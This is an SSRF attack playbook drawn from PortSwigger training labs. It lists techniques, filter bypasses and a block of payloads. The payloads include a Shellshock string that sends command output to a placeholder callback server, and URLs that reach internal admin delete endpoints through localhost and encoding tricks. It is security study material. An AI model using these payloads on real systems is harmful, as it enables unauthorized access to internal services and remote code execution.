## SSRF Playbook
*Synthesized from 7 PortSwigger labs*

### Overview
This playbook covers 7 known attack techniques for ssrf.

### Attack Techniques

**Blind Techniques:**
- Blind SSRF with out-of-band detection
- Blind SSRF with Shellshock exploitation

**Bypass Techniques:**
- SSRF with filter bypass via open redirection vulnerability

**General:**
- Basic SSRF against another back-end system
- Basic SSRF against the local server
- SSRF with blacklist-based input filter
- SSRF with whitelist-based input filter

### Key Payloads
```
() { :; }; /usr/bin/nslookup $(whoami).[CALLBACK_SERVER]
User-Agent
192.168.0.X
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=[TARGET_USER]
http://127.0.0.1/
path
8080
http://localhost/admin/delete?username=[TARGET_USER]
/admin
http://localhost/admin
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=[TARGET_USER]
http://192.168.0.1:8080/admin
/admin/delete?username=[TARGET_USER]
http://192.168.0.12:8080/admin
Referer
stockApi
http://127.1/admin
http://192.168.0.1:8080
%2523
/product/nextProduct?path=http://192.168.0.12:8080/admin
```

### Bypass Techniques
- 3. Bypass the block by changing the URL to: http://127.1/

### Indicators of Success
- Unexpected data in response
- Error messages revealing internal info
- Behavior change confirming injection
- Out-of-band callback received
- Access to unauthorized resources

### Testing Methodology
1. **Identify injection points** — forms, parameters, headers, cookies
2. **Test basic payloads** — start simple, escalate complexity
3. **Observe responses** — errors, timing, content changes
4. **Try bypasses** — encoding, alternative syntax, filter evasion
5. **Confirm impact** — data extraction, privilege escalation, RCE

